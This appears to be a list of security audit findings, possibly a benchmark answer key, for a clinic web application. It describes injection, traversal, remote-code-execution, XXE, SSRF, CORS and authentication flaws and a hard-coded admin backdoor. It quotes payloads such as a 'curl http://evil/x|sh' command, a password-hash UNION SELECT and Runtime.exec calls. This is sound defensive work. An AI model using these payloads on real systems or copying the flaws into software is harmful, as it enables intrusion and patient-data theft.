extra.message: The 'format' query parameter from GET /secure/documents/{id}/rendered?format= is concatenated directly into a shell command string executed via new ProcessBuilder("sh","-c", ...). An attacker can supply a format value such as "pdf; curl http://evil/x|sh" or using command substitution to execute arbitrary OS commands as the application user.

openChartFolio() resolves the client-supplied 'folio' value (sourced from the 'chartFolio' cookie in PortalResource.folio()) directly against the storage base directory with Path.resolve(), bypassing DocumentStorage.resolveInsideBase()'s traversal checks used everywhere else in this class. A cookie value such as '../../../../etc/passwd' lets any staff session read arbitrary files on disk.

The 'payer' parameter (sourced from the client-controlled 'payerScope' cookie via PortalResource.payerSummary()) is concatenated directly into a raw SQL string passed to JdbcTemplate.queryForList() with no parameter binding. An attacker can inject arbitrary SQL, e.g. payerScope="' UNION SELECT password_hash,email,NULL,NULL FROM app_user--" to exfiltrate data from other tables.

publishExchangePacket() resolves the caller-supplied 'packetName' (from the JSON body of POST /secure/exports/handoff) directly with exchange.resolve(packetName) and writes attacker-controlled bytes ('packetCsv') to it, with no normalization or base-directory containment check. A staff-role caller can supply packetName="../../../webapp/evil.xhtml" or similar to write/overwrite arbitrary files outside the exchange directory.

cwe: CWE-73: External Control of File Name or Path

extra.message: evaluateDoseFormula() parses and evaluates the caller-supplied 'expression' path parameter (GET /secure/prescriptions/dosing/{expression}) with Spring's SpelExpressionParser against a full StandardEvaluationContext, which permits arbitrary type/method access via SpEL's T() operator (e.g. T(java.lang.Runtime).getRuntime().exec(...)). Any authenticated clinician can achieve remote code execution on the server.

evaluateEstimate() compiles and executes the caller-supplied 'formula' query parameter (GET /secure/estimates/quote?formula=) with MVEL.executeExpression(), which can invoke arbitrary Java reflection/methods. Any clinic_admin or front_desk user can achieve remote code execution, e.g. formula="java.lang.Runtime.getRuntime().exec('...')".

receiveFromLegacyBridge() base64-decodes the 'envelope' path parameter and deserializes it with a raw ObjectInputStream.readObject() with no type filtering (no ObjectInputFilter). Any holder of a 'results:write' API key can submit a crafted serialized object; if any gadget-chain library is reachable on the classpath this results in remote code execution.

The 'assertion' is parsed with Jwts.parserBuilder()...parseClaimsJwt(assertion), which per the jjwt API only accepts UNSECURED (unsigned, alg=none) JWTs and throws for a properly signed JWS. The configured PARTNER_CONFIRM_KEY is never actually used to verify a signature. Any caller holding only the API key can forge an assertion with an arbitrary 'patientMrn' and 'summary' and have it filed into any patient's chart, since the claims carry no verified integrity.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: parseRoster() builds a DocumentBuilderFactory with only setNamespaceAware(true); it never disables DOCTYPE declarations or external general/parameter entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl, external-general-entities, load-external-dtd all left at insecure defaults). The XML content reaches here from an admin file upload (ImportExportBean) or from an admin-supplied feed URL (importFromFeed), so a crafted roster document with a DOCTYPE referencing an external/file entity can read local files or trigger SSRF during parsing.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: importFromFeed() takes a clinic-admin-supplied 'feedUrl', validates only that it starts with http:// or https://, and then has the server make an outbound GET request to it with no allowlist and no restriction on internal/loopback/link-local addresses. This lets a clinic_admin (or anyone who compromises that role) make the server issue requests to internal-only services or the cloud metadata endpoint (169.254.169.254) and read the response body back through the import result.

The 'familyName' value (from the JSON body of POST /secure/patients/index-search, reachable by front desk/clinician/admin) is concatenated unescaped into an XPath expression: "//patient[" + scopeClause + "lastName='" + familyName + "']/fullName". A value like "' or '1'='1" breaks out of the quoted literal and can neutralise the providerId scoping clause, letting a clinician enumerate patient names outside their assigned panel — defeating the panel-scoping access control this method is meant to enforce.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: The 'specialty' query parameter of GET /reference/providers/search is concatenated unescaped into an XPath expression: "//provider[contains(specialty,'" + wanted + "')]/name". A crafted specialty value breaks out of the literal and alters the query logic, e.g. to always match every provider regardless of the contains() filter.

The 'uid' path parameter of GET /reference/staff/{uid} is concatenated unescaped into an LDAP search filter: "(&(objectClass=person)(uid=" + uid + "))". A value containing LDAP metacharacters (e.g. "*)(uid=*))(|(uid=") lets an API-key holder broaden or alter the search filter to enumerate or dump the staff directory beyond the intended single-uid lookup.

applyBranding() loads the client-supplied 'brandingYaml' string with new org.yaml.snakeyaml.Yaml().load(document), using SnakeYAML's default (non-safe) Constructor. This constructor can instantiate arbitrary types named by YAML '!!' tags present on the classpath (e.g. via javax.script.ScriptEngineManager-style gadgets), which can lead to remote code execution from an authenticated session's POST body.

This filter reflects the request's 'Origin' header verbatim into Access-Control-Allow-Origin on every response (and every preflight) and also sets Access-Control-Allow-Credentials: true. This combination lets a malicious web page on ANY origin make credentialed (cookie-bearing) fetch() requests to every /secure/* endpoint and read the JSON response, because the browser will treat the reflected origin plus wildcard-like credential allowance as explicit permission. This effectively exposes notifications, document downloads, exports and other session-authenticated data to any site a logged-in user visits.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: doGet() resolves request.getPathInfo() directly against the imports directory with archive.resolve(pathInfo.substring(1)), with no normalization or containment check. web.xml maps this servlet to /intake-archive/* with NO <security-constraint> protecting it (unlike every other path under /patient, /clinician, /admin, /staff, /account, /api/secure), and directory listing is enabled via the 'listings' init-param. Any unauthenticated request such as GET /intake-archive/..%2f..%2f..%2f..%2fetc/passwd can read arbitrary files on the server filesystem, and GET /intake-archive/ lists the import archive contents to anonymous users.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: patientFromPass() parses the client-held INTAKE_PASS cookie as 'INTAKE-<patientId>-<random>' and returns parts[1] (the patientId) as authenticated without ever validating parts[2] (the random suffix) against any value stored server-side — issuePass() at line 47 never persists the random number anywhere to check against. CheckInBean.resume() then uses this unverified id to fetch and display the full Patient record and today's appointment. Any unauthenticated kiosk visitor can set the cookie to "INTAKE-<any-id>-0" to view another patient's name, demographics and appointment, defeating the only access check this flow performs.

extra.message: ensureSupportAccount() runs unconditionally on every application startup (it is called before, and independently of, the 'skip if users already exist' guard at line 96) and provisions a clinic_admin-role account 'support@northgateclinic.example' with the password hard-coded as SUPPORT_ACCESS_PHRASE ("N0rthgate-Support!24", declared at line 73). Because this is not gated behind any demo/dev profile check, this full-administrator backdoor credential is baked into the shipped source and will be provisioned in every deployment, including production, unless separately removed.
DEMO_PASSWORD is a single hard-coded password ('Passw0rd!2026') applied to every seeded demo account (staff and patients) when the database is first initialised with no users present.
